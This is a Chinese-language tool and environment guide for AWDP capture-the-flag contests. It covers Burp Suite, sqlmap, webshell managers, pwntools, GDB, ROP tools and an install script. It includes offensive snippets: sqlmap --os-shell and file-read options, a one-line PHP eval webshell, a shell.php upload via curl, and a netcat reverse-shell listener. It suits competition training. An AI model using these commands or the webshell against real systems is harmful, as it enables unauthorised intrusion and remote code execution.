# AWDP 常用工具与环境配置

## 一、赛前环境准备清单

### 必备系统
- **Linux 虚拟机**（推荐 Ubuntu 22.04）— 做题主力
- **Windows 主机** — 跑 IDA Pro、Burp Suite
- 确保两个系统之间可以互传文件（共享文件夹 / scp）

### 网络准备
- 比赛 VPN 客户端（通常赛方提供，OpenVPN 居多）
- 提前测试 VPN 连接
- 准备好代理工具（Burp Suite 代理配置）

---

## 二、Web 方向工具

### 2.1 Burp Suite（必备）

用途：抓包、改包、重放请求

```
关键功能：
- Proxy → 拦截和修改 HTTP 请求
- Repeater → 反复发送修改后的请求（测试 payload）
- Intruder → 批量爆破/Fuzz
- Decoder → 编解码工具
```

快速配置：
```
1. 浏览器设置代理 127.0.0.1:8080
2. 安装 Burp CA 证书（访问 http://burp）
3. 推荐浏览器插件：FoxyProxy（快速切换代理）
```

### 2.2 sqlmap（SQL 注入神器）

```bash
# 基础用法
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T flag --dump

# POST 请求
sqlmap -u "http://target/login" --data="user=admin&pass=123" --dbs

# 指定注入点
sqlmap -u "http://target/page?id=1*" --dbs  # * 标记注入点

# 常用参数
--batch          # 自动选择默认选项
--level=5        # 最高检测等级
--risk=3         # 最高风险等级
--tamper=space2comment  # 绕过 WAF
--os-shell       # 获取系统 shell
--file-read=/flag  # 读文件
```

### 2.3 dirsearch / gobuster（目录扫描）

```bash
# dirsearch
python3 dirsearch.py -u http://target/ -e php,txt,bak

# gobuster
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
```

### 2.4 hackbar / curl（快速测试）

```bash
# curl 发送 POST 请求
curl -X POST http://target/login -d "user=admin&pass=123"

# curl 带 Cookie
curl -b "session=abc123" http://target/admin

# curl 上传文件
curl -F "file=@shell.php" http://target/upload
```

### 2.5 中国蚁剑 / 冰蝎 / 哥斯拉

```
用途：Webshell 管理工具
- 蚁剑（AntSword）：开源，支持多种编码器
- 冰蝎（Behinder）：加密流量，不易被检测
- 哥斯拉（Godzilla）：支持多种 payload 类型

配合一句话木马使用：
<?php eval($_POST['cmd']); ?>
```

---

## 三、Pwn 方向工具

### 3.1 pwntools（Python 库，必备）

```bash
pip install pwntools
```

```python
from pwn import *

# 基础模板
context(arch='amd64', os='linux', log_level='debug')
p = remote('ip', port)
# p = process('./pwn1')

elf = ELF('./pwn1')
libc = ELF('./libc.so.6')

# ... exploit code ...

p.interactive()
```

### 3.2 GDB + pwndbg/peda/gef

```bash
# 安装 pwndbg（推荐）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 常用命令
gdb ./pwn1
b *0x401234          # 下断点
r                    # 运行
c                    # 继续
n / ni               # 单步（源码级 / 指令级）
s / si               # 步入
x/20gx $rsp          # 查看栈
vmmap                # 查看内存映射
heap                 # 查看堆状态
bins                 # 查看 free bins
telescope $rsp 20    # 查看栈内容（pwndbg）
cyclic 200           # 生成 pattern
cyclic -l 0x61616166 # 计算偏移
```

### 3.3 IDA Pro / Ghidra

```
IDA Pro：
- 反编译 C 伪代码（F5）
- 查看函数列表、字符串、交叉引用
- Keypatch 插件做 binary patch
- 快捷键：G（跳转地址）、X（交叉引用）、N（重命名）

Ghidra（免费替代）：
- 功能类似 IDA
- 自带 patch 功能
- 支持脚本（Java/Python）
```

### 3.4 ROPgadget / ropper / one_gadget

```bash
# 查找 ROP gadget
ROPgadget --binary pwn1 | grep "pop rdi"
ROPgadget --binary pwn1 --ropchain

# ropper（更快）
ropper --file pwn1 --search "pop rdi"

# one_gadget（找 libc 中的一键 getshell 地址）
one_gadget libc.so.6
# 输出类似：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL
```

### 3.5 checksec

```bash
checksec pwn1
# 输出示例：
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
```

---

## 四、通用工具

### 4.1 文件分析

```bash
file pwn1              # 文件类型
strings pwn1           # 提取字符串
strings pwn1 | grep flag
binwalk firmware.bin   # 固件/文件分析
```

### 4.2 编码/解码

```bash
# Base64
echo -n "hello" | base64
echo "aGVsbG8=" | base64 -d

# URL 编码
python3 -c "import urllib.parse; print(urllib.parse.quote('test payload'))"

# Hex
echo -n "hello" | xxd
echo "68656c6c6f" | xxd -r -p
```

### 4.3 nc（Netcat）

```bash
# 连接远程服务
nc ip port

# 监听端口（反弹 shell 接收端）
nc -lvnp 9999
```

### 4.4 Python HTTP 服务器

```bash
# 快速起一个文件服务器（传文件用）
python3 -m http.server 8888
```

---

## 五、赛前工具安装一键脚本

```bash
#!/bin/bash
# AWDP 赛前环境快速配置（Ubuntu）

sudo apt update && sudo apt install -y \
    python3 python3-pip \
    gdb gdbserver \
    netcat-openbsd \
    curl wget \
    vim tmux \
    binwalk \
    openvpn

# pwntools
pip3 install pwntools

# pwndbg
git clone https://github.com/pwndbg/pwndbg ~/pwndbg
cd ~/pwndbg && ./setup.sh

# ROPgadget
pip3 install ROPgadget

# one_gadget
sudo apt install -y ruby
sudo gem install one_gadget

# Ghidra（需要 JDK）
sudo apt install -y default-jdk
# 手动下载 Ghidra: https://ghidra-sre.org/

# sqlmap
git clone https://github.com/sqlmapproject/sqlmap ~/sqlmap

# dirsearch
git clone https://github.com/maurosoria/dirsearch ~/dirsearch

echo "环境配置完成！"
```

---

## 六、比赛时的终端布局建议

```
推荐使用 tmux 分屏：

┌──────────────────┬──────────────────┐
│                  │                  │
│   代码审计/IDA    │   exploit 编写    │
│                  │                  │
├──────────────────┼──────────────────┤
│                  │                  │
│   GDB 调试       │   nc/交互终端     │
│                  │                  │
└──────────────────┴──────────────────┘

tmux 常用快捷键（前缀 Ctrl+B）：
%  → 左右分屏
"  → 上下分屏
方向键 → 切换窗格
z  → 全屏/还原当前窗格
d  → 后台运行
```
